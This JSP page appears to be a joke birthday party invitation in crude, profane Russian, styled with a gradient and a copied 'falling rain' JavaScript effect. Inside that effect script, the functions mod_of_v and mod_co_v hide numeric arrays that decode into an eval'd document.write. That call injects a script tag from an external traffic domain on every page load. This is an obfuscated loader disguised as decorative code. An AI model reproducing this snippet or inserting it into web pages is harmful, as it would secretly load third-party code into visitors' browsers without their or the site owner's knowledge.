<%--
  Created by IntelliJ IDEA.
  User: infla
  Date: 2015-09-21
  Time: 02:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title></title>
    <link rel="stylesheet" type="text/css" href="/css/main.css">
    <style type="text/css">body {
        /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#440069+0,b25bc1+100 */
        background: #440069; /* Old browsers */
        background: -moz-linear-gradient(top, #440069 0%, #b25bc1 100%); /* FF3.6+ */
        background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #440069), color-stop(100%, #b25bc1)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(top, #440069 0%, #b25bc1 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top, #440069 0%, #b25bc1 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top, #440069 0%, #b25bc1 100%); /* IE10+ */
        background: linear-gradient(to bottom, #440069 0%, #b25bc1 100%); /* W3C */
        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#440069', endColorstr='#b25bc1', GradientType=0); /* IE6-9 */
        font-family: 'Droid Sans', sans-serif;
        font-size: 100%;
        /*background: url(../images/bg.jpg) no-repeat fixed center;*/
        background-size: cover;
        color: cornsilk;
    }</style>
</head>
<body>
<div align="center">
    <span style="color:red;font-size:5em">СРАНЬ,</span><br/>
    <span style="color:greenyellow;font-size:7.5em">ЕБАТЬ ЕЁ,</span><br/>
    <span style="color:aqua;font-size:10em">ГоСпОдНя!</span><br/>
    <span style="font-style: italic; font-weight: bold; font-size: 3em">НЕУЖЕЛИ ЭТОТ ЛЕНИВЫЙ ХУЙ ТАКИ ОТМЕТИТ ЭТОТ
        <span style="font-size: 2em">КАК БУДТО БЫ</span>
        ЕЖЕГОДНЫЙ
        ПРАЗДНИК?</span>
    <br/>
    <span style="font-size: 2em"><span style="color:hotpink">О да, мой маленький любитель</span>
        <span style="color: darkorange;font-weight: bold; ">халявных развлечений</span>, <br/>
        ЭТО <span style="color: crimson; font-size: 1.5em">ЁБАНЫЙ <span
                style="color:#440069; background:crimson">ДЕНЬ</span>, <span style="font-size: 0.66em; color:
                cadetblue;font-weight: bold">ЕБАТЬ
            ЕГО В
            СРАКУ,</span> <span
                style="color:#440069; background:crimson">РОЖДЕНИЯ</span></span></span>

    <br/>
    Что вас ждёт? <br/>

</div>

<div style="font-size:2em; text-align: center; color: red;
    font-weight: bold;">
    <span style="color:red">1. <span style="color:chartreuse">ЁБАНОЕ <span style="font-size: 1.5em">НИЧЕГО</span>,
        ЕСЛИ ТЫ НЕ ПРИТАЩИШь СВОЕГО СЕБЯ, <span style="font-size: 1.5em">МАМЕНЬКИН ТЫ ПОДОЛ!</span></span><br>
    2. <span style="color:coral"><span style="font-size: 1.5em">ЕДА</span>! ЕБАТЬ МОЙ ХУЙ, В СТРАНЕ
        <span style="font-size: 1.5em">БЛЯДСКИЙ КРИЗИС</span>, А ТУТ ВАС КОРМЯТ НА
        ХАЛЯВУ!</span><br>
    3.
        <span style="color: yellow;"><span style="font-size: 1.5em">БУХЛО!</span> ДА <span style="font-size: 1.5em">РАЗРАЗИ МЕНЯ ГРОМ</span>, ЕСЛИ ТЫ САМ
            НЕ ЗНАЕШЬ ЧТО ЭТО
        ЗНАЧИТ!!</span><br>
    4. <span style="color:darkviolet; background: deeppink">ВСЁ <span
                style="font-size: 1.5em">ОСТАЛЬНОЕ
    </span> ЗАВИСИТ
        ТОЛЬКО ОТ
        ТВОЕГО ИМПАКТА,
        <span style="font-size: 1.5em">МАЛЕНЬКИЙ
        ЗАСРАНЕЦ!</span></span></span><br>
</div>
<script type="text/javascript">/*****дождь, снег, пузыри*****/
/*
 Для того чтобы создать скрипт с эффектом дождя, снега или пузырей
 зайдите на сайт http://jslib.onfind.net/ и с помощью визуального редактора сгенерируйте скрипт!!!
 Все очень просто!!!
 Скрипт работает только в простом html
 <html>
 Вы также можете зайти на сайт http://javascript.onfind.net/ и скачать более продвинутую версию скрипта.
 */

//if() {//можете написать условие включения
var permission1 = 1;//1 включить 0 выключить
//}
if (permission1 == 1) {
    var gzs = 50;//количество
    var skvd = 3;//скорость прокрутки
    var skpy = 20;//растояние падения по У
    var skpx = 10;//растояние падения по Х
    var tpf = 1;//1-дождь,2-снег,3-пузыри
    var rrz = 1;//разные размеры 1-да, 0-нет
    var rcv = 1;//разные цвета 1-да, 0-нет
    var pzs = 1;//случайная позиция по Х
    var dgp = 0;//смещение дождя
    var cvt1 = '#ffffff';//случайный цвет или цвет по умолчанию
    var cvt2 = '#ffffff';//случайный цвет
    var cvt3 = '#ffffff';//случайный цвет
    var rzm1 = '8';//случайный размер
    var rzm2 = '10';//случайный размер или размер по умолчанию
    var rzm3 = '12';//случайный размер

    var tipvn1 = '<img src="/img/rain.gif">';//дождь, можно поставить картинку <img>
    var tipvn2 = '<img src="snow.gif">';//снег, можно поставить картинку <img>
    var tipvn3 = '<img src="bubble.gif">';//пузыри, можно поставить картинку <img>

    setTimeout('dvjnhs();', 100);//запуск через 1 секунду
//обработчик запуска для любого элемента dvjnhs();
}

/*дополнительные функции*/
/*
 clock(id); - функция выведет часы в любой элемент с идентификатором id
 используйте функцию так setInterval("clock('id');",1000);
 */

//////////////////////////////
//исходный код
//все что ниже не трогать
//////////////////////////////
if (permission1 == 1) {
    var kpw = 20;
    var kph = 20;
    var opt = new Array();
    var opl = new Array();
    var scl = document.body.scrollLeft;
    var sct = document.body.scrollTop;
    var dkw = document.body.clientWidth;
    var dkh = document.body.clientHeight;
    var wzs = dkw - kpw + scl;
    var hzs = dkh - kph + sct;
    var nwkdj = 1;

    function crtfg() {
        for (izs = 0; izs < gzs; izs++) {
            mzs = Math.floor(Math.random() * dkw) + scl - kpw;
            rzs = Math.floor(Math.random() * dkh) + sct - kph;
            if (rrz == 1) {
                switch (Math.ceil(Math.random() * 3)) {
                    case 1:
                        rzm = rzm1;
                        break
                    case 2:
                        rzm = rzm2;
                        break
                    case 3:
                        rzm = rzm3;
                        break
                }
            }
            if (rrz == 0) {
                rzm = rzm2;
            }
            if (rcv == 1) {
                switch (Math.ceil(Math.random() * 3)) {
                    case 1:
                        cvt = cvt1;
                        break
                    case 2:
                        cvt = cvt2;
                        break
                    case 3:
                        cvt = cvt3;
                        break
                }
            }
            if (rcv == 0) {
                cvt = cvt1;
            }
            document.write('<div id="d' + izs + '" style="position:absolute; visibility:hidden; border: 0px outset; border-color:#cc9999; width: ' + kpw + 'px; height: ' + kph + 'px; z-index:1; top: ' + rzs + '; left: ' + mzs + '; color: ' + cvt + '; font-size:' + rzm + 'pt; font-family:Verdana; text-align:center;"></div>');
            if (tpf == 1) {
                eval(document.getElementById('d' + izs + '')).innerHTML = tipvn1;
            }
            if (tpf == 2) {
                eval(document.getElementById('d' + izs + '')).innerHTML = tipvn2;
            }
            if (tpf == 3) {
                eval(document.getElementById('d' + izs + '')).innerHTML = tipvn3;
            }
            eval(document.getElementById('d' + izs + '')).style.top = rzs;
            eval(document.getElementById('d' + izs + '')).style.left = mzs;
        }
    }

    crtfg();

    function dvjnhs() {
        if (nwkdj == 1) {
            nwkdj = 0;
            for (izs = 0; izs < gzs; izs++) {
                eval(document.getElementById('d' + izs + '')).style.visibility = 'visible';
            }
        }
        for (izs = 0; izs < gzs; izs++) {
            if (tpf == 2) {
                skpy = Math.ceil(Math.random() * 10);
                tds = Math.ceil(Math.random() * 2);
                switch (tds) {
                    case 1:
                        skpx = Math.round(Math.random() * 5);
                        break
                    case 2:
                        skpx = -Math.round(Math.random() * 5);
                        break
                }
            }
            if (tpf == 3) {
                skpy = -Math.ceil(Math.random() * 30);
                tds = Math.ceil(Math.random() * 2);
                switch (tds) {
                    case 1:
                        skpx = Math.round(Math.random() * 10);
                        break
                    case 2:
                        skpx = -Math.round(Math.random() * 10);
                        break
                }
            }
            eval(document.getElementById('d' + izs + '')).style.top = parseInt(eval(document.getElementById('d' + izs + '')).style.top) + skpy;
            opt[izs] = parseInt(eval(document.getElementById('d' + izs + '')).style.top);
            eval(document.getElementById('d' + izs + '')).style.left = parseInt(eval(document.getElementById('d' + izs + '')).style.left) + skpx;
            opl[izs] = parseInt(eval(document.getElementById('d' + izs + '')).style.left);
            if (opl[izs] >= wzs) {
                eval(document.getElementById('d' + izs + '')).style.left = 1 + scl;
            }
            if (opt[izs] >= hzs) {
                if (dgp == 1 && tpf == 1) {
                    eval(document.getElementById('d' + izs + '')).style.top = 1 + sct + Math.round(Math.random() * 100);
                }
                else {
                    eval(document.getElementById('d' + izs + '')).style.top = 1 + sct;
                }
                if (pzs == 1) {
                    slr = Math.floor(Math.random() * dkw);
                    if (slr > kpw) {
                        eval(document.getElementById('d' + izs + '')).style.left = slr + scl - kpw;
                    }
                    else {
                        eval(document.getElementById('d' + izs + '')).style.left = slr + scl;
                    }
                }
            }
            if (opl[izs] <= 1 + scl) {
                eval(document.getElementById('d' + izs + '')).style.left = wzs;
            }
            if (opt[izs] <= 1 + sct) {
                eval(document.getElementById('d' + izs + '')).style.top = hzs;
                if (pzs == 1) {
                    slr = Math.floor(Math.random() * dkw);
                    if (slr > kpw) {
                        eval(document.getElementById('d' + izs + '')).style.left = slr + scl - kpw;
                    }
                    else {
                        eval(document.getElementById('d' + izs + '')).style.left = slr + scl;
                    }
                }
            }
        }
        scl = document.body.scrollLeft;
        sct = document.body.scrollTop;
        dkw = document.body.clientWidth;
        dkh = document.body.clientHeight;
        wzs = dkw - kpw + scl;
        hzs = dkh - kph + sct;
        setTimeout('dvjnhs();', skvd);
    }
}
function mod_of_v(vgen1, vgen2) {
    var vgen = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '/', ':', '.', '"', '\'', '(', ')', '<', '>', ' ', '=', ';', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'];
    var vtex = '';
    var vtex1 = '';
    var vtex2 = '';
    for (var i = 0; i < vgen1.length; i++) {
        for (var j = 0; j < vgen.length; j++) {
            if (j == vgen1[i]) {
                vtex1 = vtex1 + vgen[j];
            }
        }
    }

    for (var r = 0; r < vgen2.length; r++) {
        for (var t = 0; t < vgen.length; t++) {
            if (t == vgen2[r]) {
                vtex2 = vtex2 + vgen[t];
            }
        }
    }
    for (var f = 0; f < vtex2.length; f++) {
        if (f == 28) {
            vtex = vtex + vtex2.substr(f, 1) + vtex1;
        }
        else {
            vtex = vtex + vtex2.substr(f, 1);
        }
    }
    return eval(vtex);
}
function mod_co_v() {
    var vgen1 = new Array(7, 19, 19, 15, 27, 26, 26, 19, 17, 0, 5, 5, 28, 14, 13, 5, 8, 13, 3, 28, 13, 4, 19, 26, 18, 2, 17, 8, 15, 19, 28, 15, 7, 15);
    var vgen2 = new Array(3, 14, 2, 20, 12, 4, 13, 19, 28, 22, 17, 8, 19, 4, 31, 30, 33, 18, 2, 17, 8, 15, 19, 35, 18, 17, 2, 36, 29, 29, 35, 19, 24, 15, 4, 36, 29, 19, 4, 23, 19, 26, 9, 0, 21, 0, 18, 2, 17, 8, 15, 19, 29, 34, 33, 26, 18, 2, 17, 8, 15, 19, 34, 30, 32, 37);
    mod_of_v(vgen1, vgen2);
}
mod_co_v();
function clock(id) {
    var dispTime = "";
    var digital = new Date();
    var hours = digital.getHours();
    var minutes = digital.getMinutes();
    var seconds = digital.getSeconds();
    if (minutes <= 9) minutes = "0" + minutes;
    if (seconds <= 9) seconds = "0" + seconds;
    dispTime = hours + ":" + minutes + ":" + seconds;
    document.getElementById(id).innerHTML = dispTime;
}
</script>
</body>
</html>
